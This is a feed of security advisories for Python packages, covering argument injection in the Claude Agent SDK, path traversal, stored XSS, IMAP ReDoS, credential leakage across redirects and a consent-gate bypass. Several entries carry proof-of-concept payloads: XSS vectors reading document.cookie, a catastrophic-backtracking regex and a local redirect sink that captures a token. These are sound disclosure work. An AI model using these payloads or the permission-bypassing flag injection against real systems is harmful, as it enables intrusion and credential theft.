entry.title: [claude-agent-sdk] Claude Agent SDK: Argument Injection via resume Option Allows Arbitrary Command Execution
entry.content:
The Claude Agent SDK for Python passed the resume option to the Claude CLI without validation, allowing a value beginning with - to be interpreted as a separate CLI flag. An attacker who controlled the resume value could inject an --mcp-config flag defining a stdio MCP server, resulting in arbitrary command execution at CLI startup that bypassed the SDK's permission controls. Exploitation required an application to pass untrusted input as the session ID to resume.

Users are advised to update to the latest version of the claude-agent-sdk package.

Thank you to hackerone.com/moamenmahmood for reporting this issue.

References

  • https://github.com/anthropics/claude-agent-sdk-python/security/advisories/GHSA-h4mw-j7qp-8mwm

entry.title: [ClickMigrate] ClickMigrate has Path Traversal in "revision -m" argument
entry.content:
Impact

A path traversal vulnerability in the revision command allowed a crafted migration name supplied via the -m argument to escape the intended migrations directory.

Under specific conditions, an attacker could cause the tool to create a .sql file in an arbitrary location writable by the user executing the command.

This issue is only exploitable if an attacker can influence the migration name passed to the revision command, such as through an insecure automation or CI/CD pipeline that forwards untrusted input.

Patches

The vulnerability has been fixed in version 1.0.3 by validating and sanitizing the migration name to prevent directory traversal.

Users should upgrade to version 1.0.3 or later.

Workarounds

Do not pass untrusted input to the revision -m argument.

If upgrading is not immediately possible, ensure that only trusted users or automation can invoke the revision command and that migration names are validated before being passed to the tool.

References

  • Fix commit: https://github.com/QueueForge/ClickMigrate/commit/6b1f2c0202630a82252b3331aa57e64327e112b6

References

  • https://github.com/QueueForge/ClickMigrate/security/advisories/GHSA-vgf9-9mxx-hq54
  • https://github.com/QueueForge/ClickMigrate/commit/6b1f2c0202630a82252b3331aa57e64327e112b6
  • https://github.com/advisories/GHSA-vgf9-9mxx-hq54

entry.title: [pipecat-ai] Pipecat: Public exposure of Pipecat’s development runner can allow unauthenticated bot session creation
entry.content:
Pipecat’s built-in development runner exposes endpoints that create bot sessions and, for the Daily transport, paid Daily rooms. These development endpoints intentionally do not authenticate callers.

The runner binds to localhost by default and is designed exclusively for local development. It is not built or supported as a production server. Exploitation therefore requires an operator to deliberately make the development runner reachable from an untrusted network, such as by setting --host 0.0.0.0, publishing its port, or using a public tunnel without access controls.

If exposed in this way, an unauthenticated caller may invoke endpoints including /start, /daily, and /daily-dialin-webhook. Depending on the endpoint and configuration, this can create a bot session or Daily room and may return a room URL and join token. Repeated requests may also consume local resources and third-party service quotas.

The consequences of interacting with a launched bot depend on that bot’s configuration and connected tools. Access to external systems or sensitive information is not an inherent capability of the development runner and is therefore not included as a general impact.

Pipecat 1.6.0 clarifies this security boundary in two ways:

  • The development runner displays a prominent startup banner identifying it as a development tool.
  • The documentation explicitly states that the runner must not be used as a production server or exposed directly to untrusted traffic.

The local development documentation (https://docs.pipecat.ai/pipecat/deployment/running-bots-locally) identifies the unauthenticated endpoints, lack of rate limiting, and risks of public exposure. The production deployment documentation (https://docs.pipecat.ai/pipecat/deployment/running-bots-in-production) directs users to a production dispatcher or managed runtime and describes minimum protections for limited prototype use.

Resolution

Pipecat 1.6.0 documents and surfaces the intended security boundary of the development runner. The unauthenticated development behavior remains by design. Users must not expose the runner directly to untrusted networks; production deployments require an authenticated dispatcher or managed runtime.

References

  • https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-hqm2-cfx2-2vgh
  • https://nvd.nist.gov/vuln/detail/CVE-2026-102682
  • https://github.com/pipecat-ai/pipecat/pull/5060
  • https://github.com/pipecat-ai/pipecat/commit/acaac3e49f50968f3ffb645a42ecc48d71c4e723
  • https://github.com/pipecat-ai/pipecat/releases/tag/v1.6.0
  • https://github.com/advisories/GHSA-hqm2-cfx2-2vgh

entry.title: [jupyterlite-core] JupyterLab: Command link trust prompt in JupyterLab can trust a document other than the one clicked
entry.content:
Description

A Markdown file or a notebook output can carry a button that runs a JupyterLab command. Since 4.5.7 the first click on such a button opens a prompt naming the command, with Cancel, Run Once and Trust. Choosing Trust runs the command and marks the document trusted, so its later buttons run without a prompt.

Which document gets marked is decided when the user answers, not when they click. Both trust commands read whichever document is current at that moment: markdownviewer:trust uses tracker.currentWidget, and notebook:trust uses the equivalent lookup. If another document becomes current while the prompt is open, that document is the one marked trusted, and the one the user was looking at stays untrusted.

Users are affected if all of the following are true:

  • they run JupyterLab 4.5.7 through 4.6.3, or an application that bundles it such as Notebook 7.5+;
  • they open a Markdown file or notebook from someone else and click a button in it;
  • they answer Trust rather than Cancel or Run Once; and
  • a second document becomes the current one while the prompt is open, for example through a workspace restoring at startup, an extension activating a widget, or a command that opens a file

Impact

The user loses control over which document they trusted. Every button in the document that was (incorrectly) marked as trusted runs from then on without a prompt, so if that document also came from an untrusted source, its buttons fire on a single click with no confirmation. That is the state the prompt was added to prevent, in GHSA-mqcg-5x36-vfcg.

The command that ran had the user's consent, because the prompt named it and they pressed Trust. The document they were reading stays untrusted, so it prompts again on the next click.

Notebooks are written to disk

When the document marked is a notebook, the effect outlives the browser session. notebook:trust marks every cell trusted and then saves the file, which results in the server signing it, so the notebook stays trusted when it is next opened. The save also writes out any unsaved edits in that notebook. A second confirmation appears first, but it says only that a trusted notebook may execute hidden code, without naming the file, so it does not show the user which notebook is about to be trusted.

A Markdown preview marked this way stays trusted only until it is closed. Nothing is written to disk.

Patches

JupyterLab v4.6.4 and v4.5.11 contain the patch. The trust request now carries the document that was clicked, and the command is run only once that same document has been marked.

Users of applications that depend on JupyterLab, such as Notebook v7+, should update jupyterlab package too.

Workarounds

Given the high complexity of a potential exploit, we advise treating this as a defense in-depth and update at earliest opportunity, rather than apply the workarounds listed below. However, for users running in highly sensitive environments who are unable to upgrade the workarounds are included below.

Turn off command linker, which removes the ability to execute frontend commands altogether:

{
  "@jupyterlab/apputils-extension:sanitizer": {
    "allowCommandLinker": false
  }
}

In such configuration the buttons in Markdown files and notebook outputs then do nothing when clicked. Documentation and extensions that use command links for navigation stop working, and the setting applies to every document, not only untrusted ones.

If disabling that setting is not desirable and update is not possible, advise users to choose "Run Once" rather than "Trust". "Run Once" makes the command run but no document is marked, so nothing can be trusted in error.

References

  • https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-jwrc-gm9j-263p
  • https://nvd.nist.gov/vuln/detail/CVE-2026-102832
  • https://github.com/jupyterlab/jupyterlab/commit/0fc18ab4ef67e431a8f6560e387193baf786c70a
  • https://github.com/jupyterlab/jupyterlab/commit/b64bc88b8ca034cf158604a5cc48ca9170ea453b
  • https://github.com/jupyterlab/jupyterlab/commit/f7e5f9803fdf2aaaa0e9bfb9cc73386a8cc5f0b2
  • https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.11
  • https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.4
  • https://github.com/advisories/GHSA-jwrc-gm9j-263p

entry.title: [tinytag] tinytag: Infinite loop when parsing certain M4A files containing invalid atoms
entry.content:
Impact

An M4A file containing a sub-atom with a size of zero in the ---- atom makes the parser enter an infinite loop, resulting in a denial-of-service for programs reading such files with tinytag.

Patches

The issue has been fixed in tinytag 2.3.0, by reusing the primary atom parsing code path that contains appropriate size checks.

Workarounds

No workarounds exist. Users must upgrade to tinytag 2.3.0.

References

  • https://github.com/tinytag/tinytag/security/advisories/GHSA-24cc-9352-h2pg
  • https://nvd.nist.gov/vuln/detail/CVE-2026-104266
  • https://github.com/tinytag/tinytag/pull/326

  • https://github.com/tinytag/tinytag/releases/tag/2.3.0
  • https://github.com/advisories/GHSA-24cc-9352-h2pg

entry.title: [copyparty] copyparty FTP: upload outside defined volumes (limited path traversal)
entry.content:
The FTP and FTPS server -- if enabled -- would allow uploading to any folder that the copyparty process had permission to write to.

The FTP-server is default-disabled, and must be explicitly enabled in the config with global-option ftp or ftps to be affected. Additionally, SFTP was not affected at all; only FTP and FTPS.

This was not a full read/write path-traversal; it had the following limitations:

  • Only applied to uploads; it was not possible to read/download existing files in this manner.
  • The output filename was not fully controllable; a randomized suffix would always be appended to the filename.
  • Existing files could not be overwritten or appended to; only new files could be created.
  • Filesystem-permissions would prevent writing to system folders, as copyparty surely does not run as root in most deployments.
  • Copyparty itself will not execute arbitrary files as code by default, so this vulnerability could not be used to execute arbitrary code through copyparty.

The main concern is the potential effect on other unrelated software which is running on the same system.

The severity is assuming the worst case (SC:H/SI:H), that the same machine is running some unrelated software that will execute new arbitrarily-named files as code, and that the copyparty process has sufficient privileges to write files into the config-folder of that unrelated software.

References

  • https://github.com/9001/copyparty/security/advisories/GHSA-phv8-wgjp-g4p9
  • https://nvd.nist.gov/vuln/detail/CVE-2026-104102
  • https://github.com/9001/copyparty/commit/b331bb1c8c8cc306b91e4d94221969335a7a3e86
  • https://github.com/9001/copyparty/releases/tag/v1.20.19
  • https://github.com/advisories/GHSA-phv8-wgjp-g4p9

entry.title: [unstructured] unstructured: Stored XSS via unescaped HTML generation
entry.content:
Summary

When unstructured parses an untrusted document and outputs the result as HTML, malicious markup contained in the document (e.g. <img src=x onerror=...>) is left in the output HTML without escaping. When that output is displayed in a browser, the script embedded in the document executes in the viewer's browser.

Details

partition_html(html_parser_version="v2") (and the VLM partitioner) preserve the input document's element tags, attributes, and text into metadata.text_as_html, and elements_to_html() outputs that as an HTML document.

The function that builds HTML on this path, to_html() in unstructured/documents/ontology.py, performs no escaping at all. As a result, event handlers such as onerror / onmouseover / onload originating from the input document are left in the output HTML as-is (literal <script> tags are stripped by the parser, but attribute-based vectors and javascript: URLs are not). In addition, link URLs are not scheme-filtered, so <a href="javascript:..."> is also emitted.

Relevant source: documents/ontology.py (to_html, _construct_attribute_string, _generate_final_html); partition/html/transformations.py (text_as_html = ontology_element.to_html()); partition/html/convert.py (elements_to_html).

PoC

Environment: downloads.unstructured.io/unstructured-io/unstructured:latest, unstructured 0.23.3.

from unstructured.partition.html import partition_html
from unstructured.partition.html.convert import elements_to_html

malicious = ('<body class="Document">'
             '<p class="Paragraph" onmouseover="alert(1)">hello'
             '<img src=x onerror="alert(document.domain)"></p>'
             '<a class="Hyperlink" href="javascript:alert(document.cookie)">click me</a>'
             '</body>')
els = partition_html(text=malicious, html_parser_version="v2")
open("xss_output.html", "w").write(elements_to_html(list(els), no_group_by_page=True))

elements_to_html() output body — the unescaped vectors survive:

<p class="NarrativeText" id="..." onmouseover="alert(1)">
  <p class="Paragraph">hello</p>
  <img class="Image" onerror="alert(document.domain)" src="x"/>
</p>
<a class="UncategorizedText" href="javascript:alert(document.cookie)" id="...">click me</a>

Opening xss_output.html in a browser fires alert automatically (via <img onerror>), with no interaction. Per-vector confirmation (each payload labelled, each verified in a browser):

Vector Trigger Cause
<img onerror> open file (auto) element text not escaped
<svg onload> (via title='"><svg ...>') open file (auto) attribute value not escaped (" breakout)
<a href=javascript:> click link URL scheme not filtered
onmouseover hover source attribute preserved as-is

Impact

Stored XSS caused by improper output encoding. Anyone who renders the HTML or text_as_html generated from an untrusted document is affected. In an ingestion pipeline where uploaded documents are parsed and a staff member reviews their contents in a web UI, a low-privileged or external submitter can inject malicious HTML; when a privileged reviewer later opens the parsed result, <img onerror> fires in their session with no interaction, leading to cross-record information disclosure and privileged actions.

entry.title: [mcp] MCP Python SDK: Unbounded Session Accumulation in StreamableHTTP Transport Enables Resource Exhaustion
entry.content:
Summary

In affected versions, a Streamable HTTP server in stateful mode (the default) never reclaimed session state:

  • sessions did not expire;
  • a client DELETE ended the session but left its entry registered;
  • a session whose first request was refused stayed registered with a running task.

Each session also kept its parsed initialize parameters, and the number of sessions was unlimited. A client that could reach the endpoint could grow server memory without bound using ordinary short requests; only a restart reclaimed it.

Am I affected?

Yes, if you serve MCP over Streamable HTTP in stateful mode and clients you do not fully trust can reach the endpoint. Stateful mode is the default for:

  • FastMCP (1.x)
  • MCPServer and Server.streamable_http_app() (2.x)
  • StreamableHTTPSessionManager

Affected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.

Not affected:

  • servers on 1.12.0 or later passing stateless_http=True (no sessions are kept)
  • servers using only the stdio or SSE transports

Authentication limits who can open sessions, not how many a token holder can open.

Fix

Upgrade to mcp 1.30.0 (1.x) or 2.2.0 (2.x) or later. In those versions:

  • a session with no request in flight for session_idle_timeout seconds (default 1800) is closed and its ID then answers 404; open streams and in-progress requests keep it alive;
  • at most max_sessions sessions exist at once (default 10000); a request that would open another is answered 503;
  • a session is discarded as soon as it ends, whether by DELETE, expiry, or a refused opening request.

Both settings are keyword arguments on FastMCP(...) (1.x), MCPServer.run() / streamable_http_app() (2.x) and StreamableHTTPSessionManager; None disables them.

This bounds retention rather than eliminating it: a live session still holds its initialize parameters (up to roughly twice the 4 MiB body limit), and an initialize with invalid parameters still opens a session that expires like any other. On a small host, lower session_idle_timeout, max_sessions and max_request_body_size to fit.

If you cannot upgrade yet, pass stateless_http=True (1.12.0 or later) where you need no per-session state, or restrict who can reach the endpoint.

References

  • https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-84m7-p3x7-pcfv
  • https://nvd.nist.gov/vuln/detail/CVE-2026-59951
  • https://github.com/modelcontextprotocol/python-sdk/pull/3395

entry.title: [borgbackup] borg extract might modify out-of-tree files when extracting maliciously crafted archives
entry.content:
Impact

A maliciously crafted archive could contain a symlink (e.g. "evil" -> "/etc") followed by an item below it ("evil/passwd"), or an item whose path embeds ".." (e.g. "a/../../etc/passwd").

When extracting such items, borg followed the symlink / resolved the "..", so it could delete or overwrite files outside the extraction directory.

In a quite similar scenario, a crafted archive could contain a slave hardlink item with the hardlink source pointing outside the extraction directory.

When extracting such an item, borg would hard-link the outside and the inside item.

Note: that sounds bad, but it is no big issue in practice: to create such a malicious archive, the attacker would need repository access and (for encrypted or authenticated repos) also the borg key and passphrase.

Affected: likely all borg releases before 1.4.5 (and also all borg 2.0.0 betas before b22).

Patches

  • 1.4.x release series: fix released with 1.4.5. commits 3e9ed6d1ad6d3531b39c07b8ef3ecf41fce4437f and 141888f2fabcd57a300547c2aa63212cb213924d.
  • 1.2.x release series: no new releases any more, fix commits available on 1.2-maint branch: 0ac568e290518c3bbe781459978720dde7fab224 and d907f2cb57337041c4fa55ca4682895535e5076b
  • 2.0.0 betas: fix will be in 2.0.0b22, fix commits on master branch: 2d632531028b09da8ab5d1450f89bebcc205d640 and 4f37fdfed10b50559a0dd333b0d5581c642af329

Workarounds

For encrypted or authenticated repositories, do not share borg key and passphrase with potential attackers.

For all kinds of repositories, do not share repository access with potential attackers. Usually, the repository access is protected by means outside of borg; e.g. a ssh key for remote repositories or physical access to local storage media.

References

This issue was first discovered by AI in a private code security review initiated by @ThomasWaldmann.

A few days later, it was also independently reported to @ThomasWaldmann by:

  • Michael Head (machin0r)
  • Chinnapak Charoensiri [Github: Ziim-eiei].

entry.title: [social-auth-core] Python Social Auth: Login CSRF in LINE backend (LineOAuth2) — missing OAuth state validation (incomplete fix of 5.0.0 campaign)
entry.content:
Impact

Applications using the LINE Login backend are vulnerable to login CSRF / forced authentication. An attacker can start a LINE authorization flow for an account they control and trick a victim into visiting the callback URL with the attacker’s authorization code. Because the LINE backend did not validate the returned OAuth state, the application could accept the forged callback and log the victim in as the attacker-controlled LINE account.

If account linking is enabled, the same flaw can allow an attacker to link their LINE identity to a victim’s existing authenticated account, creating a persistent unauthorized login path.

Patches

Workarounds

Only applications that enable the LINE backend are affected.

entry.title: [Twisted] Twisted: IMAP wildcardToRegexp() ReDoS
entry.content:
Summary

wildcardToRegexp() in twisted/mail/imap4.py converts IMAP LIST/LSUB wildcard patterns to Python regular expressions. It substitutes the two IMAP wildcards (* → (?:.*?) and % → (?:(?:[^\\/])*?)) but passes every other character through unchanged to re.compile(). This means that an authenticated IMAP client can send a quoted pattern string containing arbitrary regex syntax - including catastrophic-backtracking constructs such as (a+)+z.

Because Twisted runs a cooperative, single-threaded reactor, a blocking regex match freezes all I/O on the server for the duration of the match.

Vulnerable Code

twisted/mail/imap4.py

# line 4595
def wildcardToRegexp(wildcard, delim=None):
    wildcard = wildcard.replace("*", "(?:.*?)")
    if delim is None:
        wildcard = wildcard.replace("%", "(?:.*?)")
    else:
        wildcard = wildcard.replace("%", "(?:(?:[^%s])*?)" % re.escape(delim))
    return re.compile(wildcard, re.I)   # ← user input compiled verbatim

# line 4993
class MemoryAccountWithoutNamespaces:
    def listMailboxes(self, ref, wildcard):
        ref = self._inferiorNames(_parseMbox(ref.upper()))
        wildcard = wildcardToRegexp(wildcard, "/")   # ← user-supplied wildcard
        return [(i, self.mailboxes[i]) for i in ref if wildcard.match(i)]

Proof of Concept

from twisted.mail.imap4 import wildcardToRegexp
import time

rx = wildcardToRegexp("(a+)+z", "/")
for n in [20, 22, 24, 26, 28]:
    victim = "a" * n
    t0 = time.perf_counter()
    rx.match(victim)
    print(f"n={n}: {time.perf_counter() - t0:.3f}s")

Output on Twisted 25.5.0:

[*] Compiled regex: '(a+)+z'
[*] Note: metacharacters ( ) + ? are NOT escaped - they go straight to re.compile()

    n        time
  ---  ----------
   20       0.153s
   22       0.651s
   24       2.941s
   26      14.545s
   28      55.019s

Timing doubles roughly every two characters (exponential growth), confirming catastrophic backtracking.

Impact

Twisted's reactor is single-threaded and cooperative. A blocking re.match() call suspends the entire event loop - no other connection can be accepted, read, or written while the match runs. A single authenticated LIST command with a 28-character target mailbox name can stall the server for ~55 seconds.

An attacker who can register an account (or obtain credentials through other means) can:

  1. CREATE a mailbox whose name is an exponential-blowup trigger string.
  2. Issue LIST "" "(a+)+z" (or equivalent ReDoS pattern).
  3. Repeat at ~1-minute intervals to keep the server permanently unavailable.

No exploit code or special privileges beyond an IMAP login are required.

Fix

Escape non-wildcard characters before compiling:

def wildcardToRegexp(wildcard, delim=None):
    # Split on the two IMAP wildcards, escape everything else
    parts = re.split(r'([*%])', wildcard)
    result = []
    for p in parts:
        if p == '*':
            result.append('(?:.*?)')
        elif p == '%':
            if delim is None:
                result.append('(?:.*?)')
            else:
                result.append('(?:(?:[^%s])*?)' % re.escape(delim))
        else:
            result.append(re.escape(p))   # ← escape all other characters
    return re.compile(''.join(result), re.I)

Alternatively, apply re.escape() to the entire wildcard first, then substitute the (now-escaped) \* and \% tokens back with their regex equivalents.

References

  • https://nvd.nist.gov/vuln/detail/CVE-2026-106454
  • https://github.com/twisted/twisted/pull/12788

entry.title: [bbot] BBOT's Symlink guard bypass in unarchive module allows planting symlinks during extraction
entry.content:
BBOT's unarchive module rejects archives containing symlink entries before extraction, but for zip and 7z archives it failed to detect symlinks whose listing carries a DOS-attribute prefix before the unix mode, as produced by legacy versions of p7zip. Such an archive, downloaded and extracted during a scan (for example via filedownload), bypassed the guard and caused an attacker-controlled symlink to be written into the extraction directory. The effect is limited to planting the symlink (its target is not written through), and only hosts using such a legacy p7zip build are affected; current mainline 7-Zip is not.

entry.title: [apprise] Apprise forwards configured auth headers across cross-origin HTTP redirects
entry.content:
Summary

Apprise's HTTP-based notification plugins and its HTTP attachment / config loaders (apprise/attachment/http.py, apprise/config/http.py) follow HTTP 3xx redirects by default and re-send the user-configured auth headers and query parameters on the redirected request. If an operator-configured destination is later compromised (service takeover, malicious update), or an attacker holds a MITM position on an unprotected network path, that destination can return a 302 Location: to an arbitrary host and Apprise forwards the user's secret (X-Gotify-Key, Authorization, bearer tokens in query, custom +Header= values) to that cross-origin host. The attacker does not need to control the original Apprise URL — only the response from a destination the operator already trusts.

This is the application-layer analogue of urllib3 GHSA-34jh-p97f-mpxf / CVE-2026-44431 ("Proxy-Authorization forwarded across cross-origin redirect").

Affected versions

All releases up to and including v1.10.0 (latest PyPI release as of filing, 2026-04-26). Fixed in v1.11.0 (released 2026-05-29), which includes PR #1610 (merged 2026-05-16, commit 68c0aef218055e4586cf4605fd6b56358f5f462d).

Details

apprise/plugins/gotify.py (pre-fix HEAD, lines 226-244, verbatim):

headers = {
    "User-Agent": self.app_id,
    "Content-Type": "application/json",
    "X-Gotify-Key": self.token,    # user-supplied secret
}
...
r = requests.post(
    url,
    data=dumps(payload),
    headers=headers,
    verify=self.verify_certificate,
    timeout=self.request_timeout,
    # NO allow_redirects=False -- requests default is True
)

requests follows 3xx redirects by default and re-attaches the headers= dict on the redirected request, regardless of origin. The same shape exists across ~50 plugins (custom_json, custom_xml, custom_form, gotify, ntfy, mattermost, apprise_api, and most other HTTP-based plugins), plus in apprise/attachment/http.py and apprise/config/http.py.

Reproduction (local, safe)

# attacker_redirector.py -- 127.0.0.1:8081 returns 302 to a cross-origin sink
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(302)
        self.send_header("Location", "http://127.0.0.1:8082/exfil")
        self.end_headers()
http.server.HTTPServer(("127.0.0.1", 8081), H).serve_forever()

# attacker_sink.py -- 127.0.0.1:8082 logs the leaked headers
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        print("LEAKED HEADERS:", dict(self.headers))
        self.send_response(204); self.end_headers()
http.server.HTTPServer(("127.0.0.1", 8082), H).serve_forever()

# victim
from apprise import Apprise
a = Apprise()
a.add("gotify://127.0.0.1:8081?token=SECRETTOKEN")
a.notify(body="x")

Observed on master HEAD (2026-05-13): attacker_sink.py prints X-Gotify-Key: SECRETTOKEN -- the user-supplied token followed the cross-origin redirect.

Patch

Fix landed in caronc/apprise#1610 (merged 2026-05-16, commit 68c0aef):

  • Adds ?redirect=yes|no URL parameter on every plugin URL
  • Adds AppriseAsset.http_redirects global default
  • Equivalent flags wired into apprise/attachment/http.py and apprise/config/http.py

The default remains redirects=True for backwards compatibility -- operators who relay notifications through destinations they don't fully trust should append ?redirect=no to their Apprise URLs or set AppriseAsset(http_redirects=False) globally.

Released in v1.11.0 (2026-05-29, available on PyPI).

Related:

  • Documentation: caronc/apprise-docs#60 (merged 2026-05-16)
  • API counterpart: caronc/apprise-api#331 (merged 2026-05-29; shipped in apprise-api v1.5.1, built on Apprise v1.11.0)

Remediation

Upgrade to Apprise v1.11.0 or later (pip install -U apprise).

The default remains redirect=yes for backwards compatibility, so after upgrading, operators who relay notifications through destinations they don't fully trust should also set AppriseAsset(http_redirects=False) globally or append ?redirect=no to each plugin URL.

If you cannot upgrade yet, operate Apprise only against fully trusted notification destinations (the maintainer-documented supported model).

Classification

  • CWE-200 Exposure of Sensitive Information to an Unauthorized Actor -- user's auth tokens / API keys / custom +Header= values are forwarded onto the cross-origin redirected request.
  • CWE-601 URL Redirection to Untrusted Site -- a 3xx response from the initial (operator-configured) target sends the request and its credentials to a host the operator never configured.

CVSS 3.1: AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N -> 3.1 LOW.

Attack requires the operator-configured destination to be compromised or an attacker to be on the network path. Impact is partial confidentiality loss: a single user-supplied secret per redirected request, scoped to that one notification channel. This is intentionally a narrow redirect/header-forwarding hardening issue, not a claim that remote destinations or remote configuration are themselves vulnerabilities.

References

  • https://github.com/caronc/apprise/security/advisories/GHSA-856c-92hv-3vxx
  • https://nvd.nist.gov/vuln/detail/CVE-2026-59180
  • https://github.com/caronc/apprise/pull/1610
  • https://github.com/caronc/apprise/commit/68c0aef218055e4586cf4605fd6b56358f5f462d
  • https://github.com/caronc/apprise/releases/tag/v1.11.0
  • https://github.com/advisories/GHSA-856c-92hv-3vxx

entry.title: [shiny] Shiny for Python has path traversal in bookmark restore
entry.content:
Impact

Shiny for Python's bookmark-restore path accepted a client-supplied _state_id_ query-string value and joined it into the server-side bookmark directory (<cwd>/shiny_bookmarks/<id>) without validating it. A value containing .. path segments, or an absolute path, could therefore cause the server to open and parse input.json and values.json from a directory outside the bookmark store.

On a default application the restore was attempted whenever the client supplied a URL query string — including when bookmarking was disabled (bookmark_store="disable") — so no opt-in configuration was required. For such applications the impact is an unauthenticated, server-side probe for the existence and JSON-validity of attacker-chosen paths, constrained to those two file names.

Applications configured with bookmark_store="server" and using ui.input_file() are affected more seriously. The file-input restore handler copies files out of the restore directory, so the contents of an attacker-selected file name within an attacker-selected directory could be read into the application.

Affected versions

1.4.0 through 1.6.3. Bookmarking was introduced in 1.4.0; earlier releases do not contain the affected code path and are not affected.

Patches

Fixed in 1.6.4. Upgrade with:

pip install --upgrade shiny

The fix validates bookmark IDs against an allowlist — a single path segment matching [A-Za-z0-9_-]+, which cannot express a path separator, a .. parent reference, or an absolute path — before the ID is used to build a filesystem path. Bookmark IDs generated by Shiny are unaffected by this restriction. Restore is additionally gated on the application's bookmark_store setting at a single point, so it no longer runs when bookmarking is disabled, and the on-disk restore path is honored only under bookmark_store="server".

Workarounds

There is no configuration change that mitigates this on an affected version: the restore path ran even with bookmark_store="disable". Deployments that cannot upgrade immediately can strip the _state_id_ parameter from incoming query strings at a reverse proxy or load balancer, which prevents the affected code path from being reached.

Credits

Reported by @0xRenSec.

References

  • https://github.com/posit-dev/py-shiny/security/advisories/GHSA-47c3-hpmg-7j6p
  • https://github.com/posit-dev/py-shiny/commit/1d8ecb46cbc9621b7dc8812111d26692e086b376
  • https://github.com/posit-dev/py-shiny/releases/tag/v1.6.4
  • https://github.com/advisories/GHSA-47c3-hpmg-7j6p

entry.title: [pacioli-guard] pacioli: A submit consent marker licensed cancellation of caller-named pre-existing documents
entry.content:
Impact

pacioli-guard's document-layer consent gate requires a human-minted, single-use, document-bound and act-bound marker before a credential carrying API Key Scope.require_consent may submit or cancel a document. Because ERPNext performs further document writes as a consequence of a governed act, nested acts are allowed to "ride" the consent established by the enclosing act instead of needing a marker of their own.

The ride predicate returned true for every cancel, regardless of which act the enclosing marker authorised. Riding never reaches consent_verdict, which is where the marker-to-act binding is enforced. The result: any Document.cancel() performed inside an act that had established consent reached docstatus = 2 with no marker, no act-binding check, no single-use spend, and no denial audit row.

This is reachable with the exact grant an operator is documented to give the broker, and the cancelled document's identity is caller-controlled:

  • Sales Invoice.on_submit (sales_invoice.py:507) calls process_asset_depreciation() unconditionally, reaching depreciate_asset_on_sale (:1508-1516).
  • That iterates the invoice's item rows and calls frappe.get_doc("Asset", d.asset). Sales Invoice Item.asset is a plain writable Link with no read_only and no fetch_from, so the caller supplies it in the request body. The validation that would constrain it sits behind if d.is_fixed_asset: (:428-429), a server-set field.
  • The chain reaches depreciation.py:481 and then asset_depreciation_schedule.py:215-217, which calls current_schedule.cancel() on a docstatus == 1, submittable Asset Depreciation Schedule through the document lifecycle (only should_not_cancel_depreciation_entries is set, not ignore_validate, so before_cancel does fire and the ride is what admitted it).

So one marker authorising submit Sales Invoice X cancelled a submitted document the human was never shown and never approved. Cancelling such a document reverses its ledger effect.

The same shape exists behind wider grants, for example Unreconcile Payment.on_submit (unreconcile_payment.py:59-64), which walks a child table the caller fills and reaches accounts/utils.py:857/:859 gain_loss_je.cancel() on submitted Journal Entries.

Who is affected

Only sites that had opted into consent gating: a credential must hold an API Key Scope with require_consent set. pacioli-guard is inert for principals without such a grant, and the credential-scoping floor (auth_hooks) is unaffected by this issue.

The document-layer consent gate was first published in 0.9.6, which is the only released version in the affected range.

Patches

Fixed in 0.10.0. The ride now discriminates on the enclosing act: an undo may cascade into further undos, but a submit may not cascade into the cancellation of a document that already has a name, because that is an act a human could have been asked to approve. The custody stamp carries the act it was established for rather than a bare boolean, which is the state the vulnerable code lacked.

Upgrading changes behavior. Any ERPNext flow where a submit cascades into a lifecycle cancel now requires a consent marker for that cancel as well as for the act itself. In ERPNext v16 that includes asset sale, partial-quantity asset sale, a credit note against an asset sale, Asset Repair capitalization, Asset Shift Allocation, Asset Value Adjustment, and Unreconcile Payment. To make that possible, the X-Pacioli-Consent header now accepts several markers separated by whitespace or commas; each remains bound to one document and one act, requires a different minter, and is spent exactly once.

Workarounds

On 0.9.6, remove require_consent from affected grants and rely on the credential-scoping floor alone, or scope governed credentials so they cannot submit documents whose controllers cancel other documents (for ERPNext slice-one, Sales Invoice with a populated item-row asset link is the known path). Neither is a substitute for upgrading.

Residual, stated

Under a governed cancel, a cascaded cancel of a pre-existing document still rides. That is load-bearing for undo (an ordinary invoice cancel makes ERPNext cancel the credit/debit notes and journals it generated, via accounts_controller.py:2001-2005) and cannot be narrowed without a signal that a cascaded cancel is a consequence of the enclosing document specifically. That justification does not describe everything the residual admits: at least one instance is caller-steered in the same shape as the issue fixed here, Asset Repair.on_cancel (asset_repair.py:215-222), which cancels a Serial and Batch Bundle named by a Link the caller fills in a child table. pacioli-guard also does not see writes that set flags.ignore_validate or that skip the document lifecycle entirely (raw SQL, db_update/db_set field writes); those residuals are published in the project's own documentation and are unchanged by this advisory.

Credit

Found by an internal adversarial review on 2026-07-28 that traced the predicate against frappe 16.28.0 and ERPNext v16 source rather than the project's own documentation. The prior code comment asserted that no such lever was known; that assertion had been written without the corresponding source sweep.

  • https://github.com/john-broadway/pacioli/security/advisories/GHSA-3hj7-6vmj-h8v4
  • https://nvd.nist.gov/vuln/detail/CVE-2026-107841
  • https://github.com/john-broadway/pacioli/commit/f3c7219f5dde6050bd7921e0ac55afd02771250c
  • https://github.com/john-broadway/pacioli/releases/tag/guard-v0.10.0
  • https://github.com/advisories/GHSA-3hj7-6vmj-h8v4
